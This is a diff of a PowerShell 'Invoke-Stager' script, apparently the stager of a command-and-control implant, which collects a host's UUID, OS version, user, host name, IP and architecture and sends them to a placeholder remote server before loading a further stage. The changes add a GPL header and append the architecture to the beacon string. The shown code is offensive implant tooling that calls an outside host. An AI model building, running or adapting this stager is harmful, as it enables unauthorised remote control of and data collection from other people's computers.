@@ -1,3 +1,19 @@
+# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+
 function Invoke-Stager {
     param (
         $r_server = "",
@@ -41,11 +57,9 @@ function Invoke-Stager {
     $string = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0] | Out-String
     $VERSION = $string.Trim()
 
-    function getOSArchitecture() {
-        $string = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
-        $string = $string.Trim()
-        return $string
-    }
+    $string = (Get-WmiObject Win32_OperatingSystem).OSArchitecture  | Out-String
+    $string = $string.Trim()
+    $OS_ARCH = $string
 
     function Get-Data {
         param($path = $script:path_get)
@@ -144,10 +158,10 @@ function Invoke-Stager {
     #$IP = getComputerIP
     #$UUID = getUUID
     
-    $TARGET = tx_data("$UUID|$VERSION|$USER|$LABEL|$NAME|$IP")
+    $TARGET = tx_data("$UUID|$VERSION|$USER|$LABEL|$NAME|$IP|$OS_ARCH|normal")
 
     stager($TARGET)
 
-} 
+}
 clear
 Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**" -r_ssl "**ssl**"
